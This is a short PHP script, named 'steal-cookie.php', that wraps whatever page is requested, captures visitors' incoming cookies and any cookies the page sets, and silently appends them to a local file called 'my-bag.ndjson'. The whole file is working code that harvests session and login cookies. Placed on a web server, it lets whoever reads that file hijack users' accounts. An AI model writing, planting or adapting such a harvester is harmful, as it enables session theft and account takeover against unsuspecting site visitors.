<?php // steal-cookie.php
# capture COOKIE.
$pre_cookie = $_COOKIE ?? [];

ob_start();
@include($_SERVER['SCRIPT_FILENAME']);
echo $____output = ob_get_clean();

# check new COOKIE (check Set-Cookie header).
$header_list = headers_list();
$set_cookie_list = [];
foreach ($header_list as $line) {
    if (preg_match('/\ASet-Cookie:[ ]*(.*)\z/ui', $line, $_) > 0) {
        // Cookie params are disposed. almost unnecessary for me.
        $set_cookie_key_val = explode(';', $_[1], 2);
        list($new_cookie_key, $new_cookie_val) = explode('=', $set_cookie_key_val[0], 2);
        if (strlen($new_cookie_key) === 0) continue; // maybe broken.
        $set_cookie_list[$new_cookie_key] = $new_cookie_val;
    }
}

# Oh? You wanna support delete cookie? Not available here now, Maybe implement in future!

# over write old $_COOKIE by Set-Cookie.
$after_cookie = $pre_cookie;
foreach ($set_cookie_list as $new_cookie_key => $new_cookie_val) {
    $after_cookie[$new_cookie_key] = $new_cookie_val;
}

# save.
@file_put_contents(
    'my-bag.ndjson',
    @json_encode(
        [
            'pre_cookie' => $pre_cookie,
            'after_cookie' => $after_cookie,
        ],
        JSON_UNESCAPED_UNICODE
    ),
    FILE_APPEND
);

exit();
